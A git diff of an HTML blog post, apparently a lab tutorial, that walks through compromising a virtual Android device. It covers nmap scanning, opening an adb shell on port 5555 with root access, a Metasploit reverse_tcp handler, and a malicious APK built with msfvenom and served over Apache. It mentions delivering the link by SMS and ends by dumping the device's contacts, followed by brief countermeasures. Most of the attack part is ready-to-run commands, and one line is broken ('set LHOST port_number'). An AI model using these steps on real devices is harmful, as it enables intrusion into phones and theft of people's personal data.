@@ -79,9 +79,9 @@
                 <div class="row gx-4 gx-lg-5 justify-content-center">
                     <div class="col-md-10 col-lg-8 col-xl-7">
                         <h2>Worldwide Mobile Operating Systems Market Share</h2>
-                        
+                        <p><i>Please be patient while the graphs load</i></p>
                         <h2>African Mobile Operating Systems Market Share</h2>
-                        
+                        <p><i>Please be patient while the graphs load</i></p>
                         <p>Looking at the graphs above my reaction is:</p>
                         <p><img src="assets/img/umm.gif" class="img-fluid mx-auto d-block" alt="umm"/></p>
                         <h2>From the Situation Room</h2>
@@ -95,53 +95,176 @@
                         <p><b style="color: red;">DISCLAIMER:</b> DO NOT TRY THIS AT HOME OR ON PUBLIC NETWORKS!</p>
                         <p><img src="assets/img/ww.gif" class="img-fluid mx-auto d-block" alt="ww"/></p>
                         <h4>Step 1:</h4>
-                        <p>Fire up the Metasploit console by running this command on your Kali Linux VM's terminal</p>
+                        <p>Open a terminal in your Kali VM and run the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">ifconfig</code> command as shown below</p>
+                        <pre><code data-language="shell">ifconfig</code></pre>
+                        <p>This will show you all the network related information you will need further in the exploit. This includes your IP address.</p>
+                        <p><img src="assets/post1pics/ifconfig.PNG" class="img-fluid mx-auto d-block" alt="ww"/></p>
+                        <h4>Step 2:</h4>
+                        <p>Run the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">nmap</code> command as shown below.</p>
+                        <pre><code data-language="shell">nmap -sP subnet</code></pre>
+                        <p><code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">nmap</code> is a Security Scanner that allows us to scan networks with different options. The flags denoted by <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">-sP</code> are the most commonly used and initiate a stealthier scan of the network as well as all the devices that are currently running. The <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">subnet</code> option is a Classless Inter-Domain Routing (CIDR) representation for IP addresses. In essence it is a bit mask that shows what portions of the IP addresses can be utilised for the scan range. The entire subnet is scanned. This is shown below.</p>
+                        <p><img src="assets/post1pics/nmap.PNG" class="img-fluid mx-auto d-block" alt="ww"/></p>
+                        <p>We can now run the following additional <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">nmap</code> command.</p>
+                        <pre><code data-language="shell">nmap -p- ip_address</code></pre>
+                        <p>This will run a full scan of the device whose IP Address was specified and any open vulnerable port(s) will be shown. This is demonstrated in the picture below.</p>
+                        <p><img src="assets/post1pics/nmap2.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>From here on out we should be able to complete our exploit as we see there is indeed an open port that is vulnerable, i.e. port <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">5555</code>.</p>
+                        <p>The next step would be to see if an Android Debug Bridge (adb) can be opened up on the Android device we want to target. This can be done by running the following <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">adb</code> command shown below.</p>
+                        <pre><code data-language="shell">adb connect ip_address:port_number</code></pre>
+                        <p>Both the IP address and the open port of the Android device are specified. The results are shown below.</p>
+                        <p><img src="assets/post1pics/adb.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>Once the connection is successfully established we can move on to opening up a shell within the virtual Android device. This can be done by running yet again another <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">adb</code> command show below.</p>
+                        <pre><code data-language="shell">adb shell</code></pre>
+                        <p>This should change your terminal prompt to "x86_64:/" and this is once again demonstrated in the picture below.</p>
+                        <p><img src="assets/post1pics/adb2.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>Once the shell has been created successfully we can now try to carry out privilege escalation by getting root access on the virtual Android device. This is done by running the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">superuser</code> command as shown below.</p>
+                        <pre><code data-language="shell">su root</code></pre>
+                        <p>If this is successful we should once again see our terminal prompt change to ":/ #" as shown in the picture below.</p>
+                        <p><img src="assets/post1pics/adb3.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>At this stage the vulnerable Android device is totally in our control. We can do as we please.</p>
+                        <p><img src="assets/img/hand.gif" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>To ensure that we are truly in control of the device. The following commands are helpful:<br/><code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">print working directory</code> and the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">listing</code> commands can be run one after the other as shown below.</p>
+                        <pre><code data-language="shell">pwd</code></pre>
+                        <pre><code data-language="shell">ls</code></pre>
+                        <p>The results of the first command should just be "/" and the results of the second command should be a long list as demonstrated in the picture below.</p>
+                        <p><img src="assets/post1pics/adb4.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>Now that privilege escalation has been successful we can move on to post exploitation where we can create a stronger more persistent stronghold within the virtual Android device.</p>
+                        <p>Although post exploitation is an entire topic on its own, the basics will be discussed a little bit.</p>
+                        <p>Firstly, run the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">change directory</code> command as shown below.</p>
+                        <pre><code data-language="shell">cd /mnt/sdcard/</code></pre>
+                        <p>This changes the directory to the SD card of the device as demonstrated in the next picture below.</p>
+                        <p>Thereafter you can create a <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">.sh</code> file called <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">testFile.sh</code> which can then be executed when ever you feel like. The file can be created by running the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">touch</code> command as shown below.</p>
+                        <pre><code data-language="shell">touch testFile.sh</code></pre>
+                        <p><img src="assets/post1pics/adb5.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>To edit a file you can easily call a text editor from the command line by running the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">vi</code> command as shown below. This text editor is default in all Unix based systems.</p>
+                        <pre><code data-language="shell">vi testFile.sh</code></pre>
+                        <p><img src="assets/post1pics/adb7.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>This will open the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">vi</code> text editor within the terminal. To edit the file you will have to enter the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">insert</code> mode of the text editor. This can be achieved by pressing the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">I</code> key on your keyboard. Once you are completed with the editing you can press <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">Esc</code> key on your keyboard. Thereafter, type the following <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">:wq!</code> and then press the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">Enter</code> key. This will write the changes to the file and quit the text editor. You will be lead back to terminal once again.</p>
+                        <p><img src="assets/post1pics/adb8.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>Above we see the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">vi</code> text editor in <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">insert</code> mode.</p>
+                        <p>Once malicious code has been written and saved you can simply execute it from the terminal because you have root access.</p>
+                        <p>Before we go further it has to be noted that if initially an open port was not found on the virtual Android device we can still carry out the exploit by following the steps discussed further down.</p>
+                        <h4>Step 3:</h4>
+                        <p>Let us carry out a new exploit!</p>
+                        <p>In a new root terminal of your Kali Linux VM fire up the <i>Metasploit console</i> by running the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">msfconsole</code> command as shown below.</p>
                         <pre><code data-language="shell">msfconsole</code></pre>
                         <p>Your terminal should now look something like this</p>
                         <p><img src="assets/post1pics/msf.PNG" class="img-fluid mx-auto d-block" alt="ww"/></p>
-                        <h4>Step 2:</h4>
-                        <p>Your terminal should have "msf6" as its prompt now. This means you can begin to use Metasploit commands. Type the command below.</p>
-                        <pre><code data-language="shell">msf6> use exploit/multi/handler</code></pre>
-                        <p>This command </p>
-                        <p><img src="assets/post1pics/msf2.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
-                        <h4>Step 3:</h4>
-                        <pre><code data-language="shell">msf6> search android/meterpreter</code></pre>
+                        <p>Your terminal should also have "msf6" as its prompt now. This means you can begin to use commands specific to <i>Metasploit</i>. Additionally, if you see any information popping up before the "msf6" prompt, then consider it an inside joke by the developers of the Framework.</p>
+                        <p><img src="assets/img/joke.gif" class="img-fluid mx-auto d-block" alt=""/></p>
                         <h4>Step 4:</h4>
-                        <pre><code data-language="shell">msf6> set payload android/meterpreter/reverse_tcp</code></pre>
+                        <p>Now inside the Metasploit console type the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">Multi_Handler</code> command as shown below.</p>
+                        <pre><code data-language="shell">msf6> use exploit/multi/handler</code></pre>
+                        <p>The <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">Multi_Handler</code> command launches a stub that runs outside the Framework. This command launches a payload that can be used by our exploit and is built to our specifications, as we will see later.</p>
                         <h4>Step 5:</h4>
-                        <pre><code data-language="shell">msf6> show options</code></pre>
+                        <p>Next run the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">Meterpreter</code> command as is shown below.</p>
+                        <pre><code data-language="shell">msf6> search android/meterpreter</code></pre>
+                        <p>This will search through the Metasploit Framework to find an exploit that fits our search terms, i.e. an Android Meterpreter exploit. The commands from this and the previous step are shown below.</p>
+                        <p><img src="assets/post1pics/msf2.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>Meterpreter is a tool that is part of the Metasploit Framework which allows you to take advantage of, as well as, find vulnerabilities in a system. This penetration testing tool can easily take hold of victim's resources as needed. Meterpreter utilises an in-memory injection which writes nothing to disk. This allows for the exploit to run without being detected by normal means. A new process is not created, rather it injects itself into a compromised process. For this reason also the forensic footprint left behind by the Meterpreter is extremly limited.</p>
                         <h4>Step 6:</h4>
-                        <pre><code data-language="shell">msf6> set LHOST ip_address</code></pre>
+                        <p>Now we can move on to setting a payload for our exploit. This can be achieved by running the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">set_payload</code> command as shown below.</p>
+                        <pre><code data-language="shell">msf6> set payload android/meterpreter/reverse_tcp</code></pre>
+                        <p>When any host initiates a connection with a server, that is defined as a <i>forward connection</i>. However, when the opposite is done, where a server initiates a connection to any hosts, then that is defined as a <i>reverse connection</i></p>
+                        <p>Firewalls work on the basic premise of blocking all incoming connections. So therefore all reverse connections are blocked by default. However, if any host initiates a forward connection it is allowed.</p>
+                        <p><code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">reverse_tcp</code> is instead of the attacker initiating the connection (which will obviously be blocked by the firewall), the target initiates the connection to the attacker. The attacker can then take control of the target device and pass commands. It is a type of reverse shell.</p>
+                        <p><img src="assets/post1pics/msf11.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
                         <h4>Step 7:</h4>
-                        <pre><code data-language="shell">msf6> set LHOST port_number</code></pre>
+                        <p>The next step will be to configure the options for our payload. This can be done by running the command listed below.</p>
+                        <pre><code data-language="shell">msf6> show options</code></pre>
+                        <p>The <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color:white;">show options</code> command shows the current options for the payload. These can then be changed, as is demonstrated in further steps below.</p>
+                        <p><img src="assets/post1pics/msf12.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>The 2 options listed will be looked at namely; <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">LHOST</code> and <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">LPORT</code></p>
                         <h4>Step 8:</h4>
-                        <pre><code data-language="shell">msf6> exploit</code></pre>
-                        <p>This command begins the exploit and the <i>Listener</i> begins to "listen" for incoming requests sent by the victim's Android device.</p>
+                        <p>To change the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">LHOST</code> option run the command as shown below.</p>
+                        <pre><code data-language="shell">msf6> set LHOST ip_address</code></pre>
+                        <p>The above command sets the IP address that will become a <i>Listener</i>, in other words which IP address all the communication from the victim will be forwarded to. This is set to the IP address our Kali Linux VM.</p>
                         <h4>Step 9:</h4>
-                        <p>In a new terminal start up the Metasploit console once again, and input the following command</p>
-                        <pre><code data-language="shell">msf6> msfvenom –p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > /var/www/html/share/filename.apk</code></pre>
-                        <p>This command is used to create the malicious payload for the Android device. The APK file is saved to the share folder of the Apache server on our Kali Linux VM. A screenshot is show below.</p>
-                        <p><img src="assets/post1pics/msf3.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
-                        <p>If you see how small this file is, then this should be a red flag for you as a victim in the future.</p>
+                        <p>To change the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">LPORT</code> option run the command below.</p>
+                        <pre><code data-language="shell">msf6> set LHOST port_number</code></pre>
+                        <p>The above command changes the option of which port the <i>Listener</i> should receive information. This is usually an open port that is not being used by any other process or service.</p>
+                        <p><img src="assets/post1pics/msf13.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>The above picture demonstrates the options being changed. The IP address was set to <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">10.0.2.15</code> and the port was set to <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">4444</code></p>
+                        <h4>Step 10:</h4>
+                        <p>The only thing remaining to do is begin the exploit. This can be achieved by running the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">exploit</code> command as shown below.</p>
+                        <pre><code data-language="shell">msf6> exploit</code></pre>
+                        <p>This aforementioned command begins the exploit and the <i>Listener</i> will listen to any incoming responses from the victim. This is usually after the victim installs the malicious APK file and opens it on their Android device. This is discussed further in the next steps.</p>
+                        <p><img src="assets/post1pics/msf14.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <h4>Step 11:</h4>
+                        <p>Let us start to create the malicious APK file!</p>
+                        <p>In a new terminal start up the <i>Metasploit console</i> once again, and input the following <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">msfvenom</code> command.</p>
+                        <pre><code data-language="shell">msf6> msfvenom –p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > /var/www/html/share/MyAwesomeApp.apk</code></pre>
+                        <p>The <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">msfvenom</code> command is used to create the malicious payload for the Android device. The APK file is saved to the share folder of the Apache server on our Kali Linux VM. A screenshot is show below.</p>
+                        <p><img src="assets/post1pics/msfvenom.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>If you see how small this file is, then this should be a <span style="color: red;">red flag</span> for you as a victim in the future.</p>
                         <p>You should feel like this if you do come across such a file in the wild.</p>
                         <p><img src="assets/post1pics/sweating-wet.gif" class="img-fluid mx-auto d-block" alt=""/></p>
-                        <p>The malicious APK can now be accessed on the Android device and installed. To do this, run the following command below.</p>
+                        <h4>Step 12:</h4>
+                        <p>The malicious APK can now be accessed on the virtual Android device and installed. To do this, open a new terminal in your Kali Linux VM and run the following <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">service</code> command below.</p>
                         <pre><code>service apache2 start</code></pre>
-                        <p>Accessing the following link on the Android device's browser will open up the share folder.</p>
+                        <p><img src="assets/post1pics/apache.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>Above we see that the malicious APK file has been created in the folder as we specified earlier. Additionally, running the following <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">service</code> command will show you if the Apache server is indeed up and running.</p>
+                        <pre><code data-language="shell">service apache2 status</code></pre>
+                        <p>Accessing the following link <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">http://IP_Address/share/</code> on the virtual Android device's browser will open up the share folder.</p>
                         <pre><code>10.0.2.15/share/</code></pre>
-                        <p>This is shown below.</p>
-                        <img src="assets/post1pics/msf4.PNG" class="img-fluid mx-auto d-block" alt=""/>
+                        <p>The <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">IP_Address</code> was replaced with the our Kali Linux VM's IP address. This is shown below.</p>
+                        <img src="assets/post1pics/apache2.PNG" class="img-fluid mx-auto d-block" alt=""/>
+                        <p>In a real world setting this link can automatically download the file if embedded in a SMS for example.</p>
                         <p>Once the victim downloads the file and opens it, they will see the following installation screen.</p>
-                        <img src="assets/post1pics/msf5.PNG" class="img-fluid mx-auto d-block" alt=""/>
-                        <p>If the malicious file is installed, it is game over!</p>
-                        <p>The hacker is going to be like</p>
+                        <img src="assets/post1pics/app1.PNG" class="img-fluid mx-auto d-block" alt=""/>
+                        <img src="assets/post1pics/app2.PNG" class="img-fluid mx-auto d-block" alt=""/>
+                        <p>If you carefully look at the permissions required by this App you should <span style="color: red;">NEVER EVER</span> install the App.</p>
+                        <p>However, if the malicious file is installed, it is game over!</p>
+                        <p><img src="assets/post1pics/app3.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>The hacker is going to be like: Thank you very much!</p>
                         <p><img src="assets/post1pics/thumbs-up-hacker.gif" class="img-fluid mx-auto d-block" alt=""/></p>
-                        <p>From here on the hacker will have full control of the Android device. A list of commands can be accessed for meterpreter by typing the following command</p>
-                        <pre><code>meterpreter --help</code></pre>
-                        <p>A screenshot is shown below</p>
+                        <h4>Step 13:</h4>
+                        <p>The terminal where the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">exploit</code> command was run will now change. The prompt in the terminal will now be <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">meterpreter ></code> as demonstrated below.</p>
+                        <pre><code data-language="shell">meterpreter ></code></pre>
+                        <p>From here on the hacker will have full control of the virtual Android device. A full list of <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">meterpreter</code> commands can be accessed by typing the following <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">help</code> command as demonstrated below.</p>
+                        <pre><code>meterpreter > help</code></pre>
+                        <p>A screenshot of some of these commands is shown.</p>
                         <p><img src="assets/post1pics/msf6.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
                         <p>A more comprehensive list of commands is shown below which was taken from the documentation of Metasploit</p>
-                        <iframe src="assets/commands.txt" frameborder="2" width="110%"></iframe>
+                        <iframe style="background-color: seashell;" src="assets/commands.txt" frameborder="2" width="110%"></iframe>
+                        <p>Some of these commands are quite dangerous and can easily compromise a victim within seconds.</p>
+                        <p><img src="assets/img/freindo-kevin.gif" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p><img src="assets/img/thats-scary-creepy.gif" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <h4>Step 14:</h4>
+                        <p>Now that the exploit is complete we can move onto a quick example of post exploitation.</p>
+                        <p>Firstly, a few dummy contacts were created in the virtual Android device. This is shown below.</p>
+                        <p><img src="assets/post1pics/contacts.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>Now we will access these contacts from our Kali Linux VM through the exploit we have just carried out.</p>
+                        <h4>Step 15:</h4>
+                        <p>Navigate to the terminal where the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">meterpreter</code> service is running and run the following <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">meterpreter</code> command.</p>
+                        <pre><code data-language="shell">meterpreter > shell</code></pre>
+                        <p><img src="assets/post1pics/meter4.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>This will open up a shell within the virtual Android device as we have done previously. We can also see the malicious file we created previously.</p>
+                        <h4>Step 16:</h4>
+                        <p>Now run the following <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">meterpreter</code> command as shown below.</p>
+                        <pre><code data-language="shell">meterpreter > dump_contacts</code></pre>
+                        <p>This command dumps all the contacts that are on the exploited device into a <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">.txt</code> file. This is shown below.</p>
+                        <p><img src="assets/post1pics/meter7.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>From here on you can carry out any other command you feel like. It is up to you as the attacker to decide what to do.</p>
+                        <h3>Countermeasures</h3>
+                        <p>So you may ask <i>"What can we do, J&amp;A to protect ourselves and our devices?"</i></p>
+                        <p>This is the advice we can offer at J&amp;A</p>
+                        <ul>
+                            <li>Do not use open Wi-Fi networks.</li>
+                            <li>Disable the <i>"Install Apps from Unknown sources".</i></li>
+                            <li>option in your device settings.</li>
+                            <li>Only install verified applications from the Google Play store or other trusted stores such as F-Droid.</li>
+                            <li>Do not open files that are sent to you from unknown parties.</li>
+                            <li>Install and keep updated an Anti-Malware tool on your device.</li>
+                            <li>Install and keep updated an Anti-Virus software on your device.</li>
+                            <li>If possible, pay for a VPN service for your device.</li>
+                            <li>Do not carry out sensitive processes on your device if it is not secured or you do not have a VPN.</li>
+                            <li>Do not open any correspondence you receive on your device that is from an unknown party.</li>
+                            <li>Keep you device updated at all times, especially security updates/patches.</li>
+                            <li>Keep your applications on your device updated at all times and if possible disable auto-updates. This will allow you to keep track of what is updated and </li>when.
+                            <li>Delete any application on your device if you have not used it in the past month (This excludes your built-in applications).</li>
+                            <li>Disable Background processes (for applications) on your device.</li>
+                        </ul>
                         <p>
                         <blockquote class="blockquote">"We're always chasing the bad guys – the good guys are never ahead. We're not the ones who wrote these exploits. They are often found in the wild and the defenders are generally following the black hats."<br/> - H. D. Moore, Network Security Expert, Founder of the Metasploit Project</blockquote>
                         </p>
